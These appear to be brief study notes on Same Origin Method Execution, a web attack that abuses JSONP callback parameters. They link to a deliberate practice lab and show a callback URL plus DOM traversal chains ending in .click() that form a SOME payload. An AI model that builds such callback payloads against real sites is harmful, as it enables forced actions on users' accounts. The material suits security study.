Same Origin Method Execution (SOME)
 - HTML  Injection be
 - iframe does not allow taking script from another site.
 - Universal XSS

Vulnerable Lab

```
https://www.someattack.com/Playground/

```
Original Author Ben Hayak's Blog

```
http://www.benhayak.com/2015/06/same-origin-method-execution-some.html

```
JavaScript Function ( Main Source )

```
<script> function changeColor(param) {
        document.getElementById("box").style.backgroundColor=param;
        } </script>

```

Color Picker

```
https://www.someattack.com/Playground/ColorPicker.php

```

Color Picker JavaScript Callback

```
https://www.someattack.com/Playground/ColorPicker.php?callback=changeColor

```

Target Reference ( Use Inspect Element )

```
document.getElementsByClassName("pure-controls")
document.getElementsByClassName("pure-controls")[0]
document.getElementsByClassName("pure-controls")[0].firstChild
document.getElementsByClassName("pure-controls")[0].firstChild.nextElementSibling
document.getElementsByClassName("pure-controls")[0].firstChild.nextElementSibling.click()

```

or

```
document.body.firstElementChild.firstChild.nextElementSibling.nextElementSibling.nextElementSibling.firstElementChild.nextElementSibling.firstElementChild.nextElementSibling.nextElementSibling.nextElementSibling.nextElementSibling.nextElementSibling.firstElementChild.click

```


